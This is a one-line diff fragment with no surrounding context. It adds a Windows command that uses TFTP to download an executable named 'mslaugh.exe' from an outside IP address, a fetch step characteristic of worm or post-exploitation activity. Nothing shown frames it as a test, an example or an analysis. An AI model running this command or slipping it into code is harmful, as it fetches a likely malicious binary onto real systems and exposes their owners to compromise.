@@ -1,0 +1,1 @@
+tftp -i 192.56.226.56 GET mslaugh.exe
